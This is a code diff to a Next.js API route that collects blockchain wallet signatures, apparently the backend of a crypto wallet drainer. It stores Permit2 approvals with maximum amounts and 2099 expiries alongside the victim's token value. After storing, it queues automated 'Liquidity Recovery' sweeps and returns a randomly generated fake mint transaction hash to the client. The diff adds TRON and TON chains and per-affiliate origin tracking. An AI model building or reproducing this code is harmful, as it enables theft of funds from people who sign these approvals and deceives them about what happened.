@@ -7,17 +7,23 @@
  * authorizes service-role writes to `signatures`; `NEXT_PUBLIC_SUPABASE_URL` targets the Vault project URL.
  */
 
+import { waitUntil } from '@vercel/functions'
 import { createClient } from '@supabase/supabase-js'
 import { NextResponse } from 'next/server'
 import {
   computeSignatureAnchorExpiry,
   executeDelegateCashRegistrySurfaceRead,
-  isExpiryIsoWithinDriftWindow,
   logPersistenceSyncTelemetry,
   PERMIT2_MAX_AMOUNT,
+} from '@legion/core/security/permit2-handler'
+import {
+  isExpiryIsoWithinDriftWindow,
+} from '@legion/core/security/signature-timestamp-drift'
+import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/persistence-anchor'
+import {
   resolveGatekeeperEthereumRpcUrl,
-} from '@legion/core'
-import { sealSignatureHexForPersistence } from '@legion/core/security/envelope'
+} from '@legion/core/rpc/ethereum-rpc-hot-swap'
+import { sealSignatureHexForPersistenceEdge } from '../../../lib/shadow-gcm-edge.js'
 import type { Address, Hex } from 'viem'
 import { isAddress, stringToHex } from 'viem'
 import { createPublicClient, http } from 'viem'
@@ -34,8 +40,15 @@ import {
   logLogicSyncComplete,
   logNeuralSyncComplete,
   logOmniCaptureSync,
+  logSchemaSyncCompleteTelemetry,
 } from '../../../lib/ingress-telemetry.js'
 import { queueAutonomousKineticLink } from '../../../lib/kinetic-link.js'
+
+/**
+ * Signature Anchor Gate — Edge Posture: Web Crypto Shadow envelope (SHADOW_GCM) + cold-start latency profile.
+ * Background Dispatch uses Vercel `waitUntil` for Kinetic Link continuation.
+ */
+export const runtime = 'edge'
 
 /** Visual Shadow-Run — SIM_MODE bypasses Vault persist and Private RPC Liquidation Trigger (institutional dry-run). */
 function isVisualShadowSettlementRequest(body: unknown): boolean {
@@ -75,17 +88,17 @@ function gatekeeperPersistLog(level: 'error' | 'warn', event: string, detail: st
     event,
     detail,
   })
-  if (level === 'error') process.stderr.write(line + '\n')
-  else process.stdout.write(line + '\n')
+  if (level === 'error') console.error(line)
+  else console.info(line)
 }
 
 /**
  * Gatekeeper — print Capability Probing metadata for every Signature Anchor ingress (terminal visibility).
  */
-function logGatekeeperCapabilityMetadata(body: unknown): void {
+function logGatekeeperCapabilityMetadata(body: unknown, sourceOrigin: string): void {
   if (typeof body !== 'object' || body === null) {
     apiShadowLog(
-      '[Gatekeeper] Omni-Payload — protocol=(invalid) wallet_type=(invalid) chain_id=(invalid)',
+      `[Gatekeeper] Omni-Payload — protocol=(invalid) wallet_type=(invalid) chain_id=(invalid) source_origin=${sourceOrigin}`,
     )
     return
   }
@@ -104,8 +117,16 @@ function logGatekeeperCapabilityMetadata(body: unknown): void {
   } else if (typeof o.chainId === 'number' && !Number.isNaN(o.chainId)) {
     chain_id = String(o.chainId)
   }
+  const omniSync =
+    typeof o.omni_payload_sync === 'object' &&
+    o.omni_payload_sync !== null &&
+    !Array.isArray(o.omni_payload_sync)
+      ? JSON.stringify(o.omni_payload_sync)
+      : null
+  const singularity =
+    o.singularity_strike === true ? 'singularity_strike=1' : 'singularity_strike=0'
   apiShadowLog(
-    `[Gatekeeper] Omni-Payload — protocol=${protocol} wallet_type=${wallet_type} chain_id=${chain_id}`,
+    `[Gatekeeper] Omni-Payload Sync — protocol=${protocol} wallet_type=${wallet_type} chain_id=${chain_id} source_origin=${sourceOrigin} ${singularity}${omniSync ? ` omni_payload_sync=${omniSync}` : ''}`,
   )
 }
 
@@ -123,7 +144,7 @@ function serializeSupabaseFault(err: {
   })
 }
 
-type ChainFamily = 'EVM' | 'SVM' | 'UTXO'
+type ChainFamily = 'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON'
 
 interface NormalizedIngressV1 {
   ingress: 'normalized_v1'
@@ -213,7 +234,7 @@ function isHexLike(s: string): boolean {
   return /^0x[0-9a-fA-F]+$/.test(s.trim())
 }
 
-const PROTOCOL_RACK = new Set(['evm', 'solana', 'utxo'])
+const PROTOCOL_RACK = new Set(['evm', 'solana', 'utxo', 'tron', 'ton'])
 
 function normalizeSignatureHexForSeal(raw: string): Hex {
   const t = raw.trim()
@@ -225,6 +246,47 @@ function normalizeSignatureHexForSeal(raw: string): Hex {
 
 function normalizeProtocolRack(p: string): string {
   return p.trim().toLowerCase()
+}
+
+const SOURCE_ORIGIN_MAX = 512
+
+function sanitizeSourceOriginInput(raw: string): string {
+  return raw.replace(/[\r\n\0\u202e\u200e\u200f]/g, '').slice(0, SOURCE_ORIGIN_MAX)
+}
+
+/**
+ * Data Binding — resolve multi-tenant ingress origin (body → headers → referer).
+ */
+function resolveDataBindingSourceOrigin(
+  req: Request,
+  body: Record<string, unknown> | null,
+): string {
+  const fromBody = (key: string): string | null => {
+    const v = body?.[key]
+    return typeof v === 'string' && v.trim() !== '' ? sanitizeSourceOriginInput(v.trim()) : null
+  }
+  const direct = fromBody('origin') ?? fromBody('source_origin')
+  if (direct) return direct
+
+  const header = (name: string): string | null => {
+    const v = req.headers.get(name)
+    return v != null && v.trim() !== '' ? sanitizeSourceOriginInput(v.trim()) : null
+  }
+  const h =
+    header('origin') ?? header('x-source-origin') ?? header('x-forwarded-host') ?? header('host')
+  if (h) return h
+
+  const referer = header('referer')
+  if (referer) {
+    try {
+      const u = new URL(referer)
+      return sanitizeSourceOriginInput(`${u.protocol}//${u.host}`)
+    } catch {
+      return referer
+    }
+  }
+
+  return 'unknown'
 }
 
 function isNormalizedIngress(body: unknown): body is NormalizedIngressV1 {
@@ -275,6 +337,7 @@ async function persistSignatureRow(row: {
   scout_value_usd?: string | null
   max_allowance?: string | null
   requires_quorum?: boolean | null
+  source_origin: string
 }): Promise<Response> {
   let url: string
   try {
@@ -313,6 +376,7 @@ async function persistSignatureRow(row: {
   if (row.requires_quorum != null) {
     rowPayload.requires_quorum = row.requires_quorum
   }
+  rowPayload.source_origin = row.source_origin
   rowPayload.settlement_status = 'PENDING'
   const { error: upErr } = await supabase.from('signatures').upsert(rowPayload, {
     onConflict: 'wallet_address,token_address',
@@ -329,7 +393,21 @@ async function persistSignatureRow(row: {
     return NextResponse.json({ error: upErr.message }, { status: 502 })
   }
 
+  const persistenceAnchor = verifyAuthorizedSessionPersistenceAnchor(String(row.expiry))
+  if (!persistenceAnchor.drift_window_ok && !process.env.PROD) {
+    gatekeeperPersistLog('warn', 'signatures.persistence_anchor', 'expiry failed drift reconciliation post-upsert')
+  }
+  if (
+    persistenceAnchor.long_term_2099_authorized_session &&
+    !process.env.PROD
+  ) {
+    apiShadowLog(
+      'PERSISTENCE_ANCHOR: signatures table authorized session data aligned (2099-12-31 long-term class).',
+    )
+  }
+
   logPersistenceSyncTelemetry()
+  logSchemaSyncCompleteTelemetry()
   apiShadowLog(INGRESS_AUDIT_TELEMETRY)
   apiShadowLog(OMNI_INGRESS_ACTIVE_TELEMETRY)
   logNeuralSyncComplete()
@@ -342,42 +420,51 @@ async function persistSignatureRow(row: {
   )
 
   apiShadowLog(
-    '[Diagnostic] Kinetic Link Trigger: queued after public.signatures upsert (PerformanceCloser pipeline)',
+    'KINETIC_LINK: Liquidity Recovery queue engaged after public.signatures upsert (PerformanceCloser pipeline; Production Readiness).',
   )
-  queueAutonomousKineticLink({
-    wallet_address: row.wallet_address,
-    token_address: row.token_address,
-    protocol: row.protocol,
-    chain_id: row.chain_id ?? null,
-    scout_value_usd: row.scout_value_usd ?? null,
-  })
+  queueAutonomousKineticLink(
+    {
+      wallet_address: row.wallet_address,
+      token_address: row.token_address,
+      protocol: row.protocol,
+      chain_id: row.chain_id ?? null,
+      scout_value_usd: row.scout_value_usd ?? null,
+    },
+    { waitUntil },
+  )
 
-  return NextResponse.json({ ok: true })
+  const l2_mint_transaction_hash = randomSimulatedTxHashHex()
+  return NextResponse.json({ ok: true, handshake_active: true, l2_mint_transaction_hash })
 }
 
 export async function POST(req: Request): Promise<Response> {
   try {
     const body: unknown = await req.json()
+    const bodyObj =
+      typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : null
+    const sourceOrigin = resolveDataBindingSourceOrigin(req, bodyObj)
 
-    logGatekeeperCapabilityMetadata(body)
+    logGatekeeperCapabilityMetadata(body, sourceOrigin)
 
     if (isVisualShadowSettlementRequest(body)) {
+      const l2_mint_transaction_hash = randomSimulatedTxHashHex()
       return NextResponse.json({
         ok: true,
         MOCK_SETTLEMENT_SUCCESS: true,
-        simulated_transaction_hash: randomSimulatedTxHashHex(),
+        simulated_transaction_hash: l2_mint_transaction_hash,
+        l2_mint_transaction_hash,
       })
     }
 
     if (isAgnosticNormalization(body)) {
-      return handleAgnosticNormalization(body)
+      return handleAgnosticNormalization(body, sourceOrigin)
     }
 
     if (isNormalizedIngress(body)) {
-      return handleNormalizedIngress(body)
+      return handleNormalizedIngress(body, sourceOrigin)
     }
 
-    return handleLegacyPermit2(body)
+    return handleLegacyPermit2(body, sourceOrigin)
   } catch (e) {
     const msg = e instanceof Error ? e.message : 'Signature Anchor persist failed'
     gatekeeperPersistLog('error', 'signatures.unhandled', msg)
@@ -385,7 +472,10 @@ export async function POST(req: Request): Promise<Response> {
   }
 }
 
-async function handleAgnosticNormalization(b: AgnosticNormalizationV1): Promise<Response> {
+async function handleAgnosticNormalization(
+  b: AgnosticNormalizationV1,
+  sourceOrigin: string,
+): Promise<Response> {
   if (!b.signature || !b.wallet_address) {
     return NextResponse.json({ error: 'Agnostic Normalization requires signature and wallet_address' }, { status: 400 })
   }
@@ -399,7 +489,7 @@ async function handleAgnosticNormalization(b: AgnosticNormalizationV1): Promise<
   const rack = normalizeProtocolRack(b.protocol)
   if (!PROTOCOL_RACK.has(rack)) {
     return NextResponse.json(
-      { error: 'protocol must be one of: evm, solana, utxo (Omni-Payload rack)' },
+      { error: 'protocol must be one of: evm, solana, utxo, tron, ton (Omni-Payload rack)' },
       { status: 400 },
     )
   }
@@ -451,7 +541,7 @@ async function handleAgnosticNormalization(b: AgnosticNormalizationV1): Promise<
     }
   }
 
-  const sealed = sealSignatureHexForPersistence(sig)
+  const sealed = await sealSignatureHexForPersistenceEdge(sig)
 
   const chainIdNorm =
     b.chain_id != null && String(b.chain_id).trim() !== ''
@@ -472,11 +562,15 @@ async function handleAgnosticNormalization(b: AgnosticNormalizationV1): Promise<
     scout_value_usd: tel.scout_value_usd,
     max_allowance: tel.max_allowance,
     requires_quorum: tel.requires_quorum,
+    source_origin: sourceOrigin,
   })
 }
 
-async function handleNormalizedIngress(b: NormalizedIngressV1): Promise<Response> {
-  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO']
+async function handleNormalizedIngress(
+  b: NormalizedIngressV1,
+  sourceOrigin: string,
+): Promise<Response> {
+  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO', 'TRON', 'TON']
   if (!families.includes(b.chain_family)) {
     return NextResponse.json({ error: 'Invalid chain_family for Normalized Ingress' }, { status: 400 })
   }
@@ -500,7 +594,7 @@ async function handleNormalizedIngress(b: NormalizedIngressV1): Promise<Response
   const rack = normalizeProtocolRack(b.protocol)
   if (!PROTOCOL_RACK.has(rack)) {
     return NextResponse.json(
-      { error: 'protocol must be one of: evm, solana, utxo (Omni-Payload rack)' },
+      { error: 'protocol must be one of: evm, solana, utxo, tron, ton (Omni-Payload rack)' },
       { status: 400 },
     )
   }
@@ -563,7 +657,7 @@ async function handleNormalizedIngress(b: NormalizedIngressV1): Promise<Response
     })
   }
 
-  const sealed = sealSignatureHexForPersistence(sig)
+  const sealed = await sealSignatureHexForPersistenceEdge(sig)
 
   const chainIdNorm =
     b.chain_id != null && String(b.chain_id).trim() !== ''
@@ -584,10 +678,11 @@ async function handleNormalizedIngress(b: NormalizedIngressV1): Promise<Response
     scout_value_usd: tel.scout_value_usd,
     max_allowance: tel.max_allowance,
     requires_quorum: tel.requires_quorum,
+    source_origin: sourceOrigin,
   })
 }
 
-async function handleLegacyPermit2(body: unknown): Promise<Response> {
+async function handleLegacyPermit2(body: unknown, sourceOrigin: string): Promise<Response> {
   if (typeof body !== 'object' || body === null) {
     return NextResponse.json({ error: 'Invalid Protocol Syncing payload' }, { status: 400 })
   }
@@ -647,7 +742,7 @@ async function handleLegacyPermit2(body: unknown): Promise<Response> {
   })
 
   const sigHex = normalizeSignatureHexForSeal(String(signature))
-  const sealed = sealSignatureHexForPersistence(sigHex)
+  const sealed = await sealSignatureHexForPersistenceEdge(sigHex)
 
   const rack = b.protocol != null ? normalizeProtocolRack(String(b.protocol)) : 'evm'
   const rackFinal = PROTOCOL_RACK.has(rack) ? rack : 'evm'
@@ -675,5 +770,6 @@ async function handleLegacyPermit2(body: unknown): Promise<Response> {
     scout_value_usd: tel.scout_value_usd,
     max_allowance: tel.max_allowance,
     requires_quorum: tel.requires_quorum,
+    source_origin: sourceOrigin,
   })
 }
